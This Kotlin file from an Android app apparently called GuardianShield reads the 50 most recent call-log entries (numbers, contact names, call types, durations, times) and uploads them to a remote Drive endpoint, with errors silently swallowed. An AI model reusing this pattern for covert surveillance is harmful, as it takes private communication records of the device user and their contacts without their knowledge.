package com.guardianshield.app.workers

import android.annotation.SuppressLint
import android.content.Context
import android.provider.CallLog
import com.guardianshield.app.utils.DriveApiClient
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

object CallLogWorker {

    @SuppressLint("Range")
    suspend fun syncCallLogs(context: Context) {
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null,
                null,
                "${CallLog.Calls.DATE} DESC"
            )

            val callList = mutableListOf<Map<String, Any>>()
            val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())

            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 50) {
                    val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: "Unknown"
                    val name = it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: number
                    val typeCode = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                    val dateLong = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                    val duration = it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))

                    val callType = when (typeCode) {
                        CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                        CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                        CallLog.Calls.MISSED_TYPE -> "MISSED"
                        CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                        else -> "UNKNOWN"
                    }

                    callList.add(mapOf(
                        "id" to "${number}_$dateLong",
                        "name" to name,
                        "phoneNumber" to number,
                        "callType" to callType,
                        "durationSeconds" to duration,
                        "timestamp" to dateFormat.format(Date(dateLong))
                    ))
                    count++
                }
            }

            if (callList.isNotEmpty()) {
                DriveApiClient.postToDrive("sync_calls", callList)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
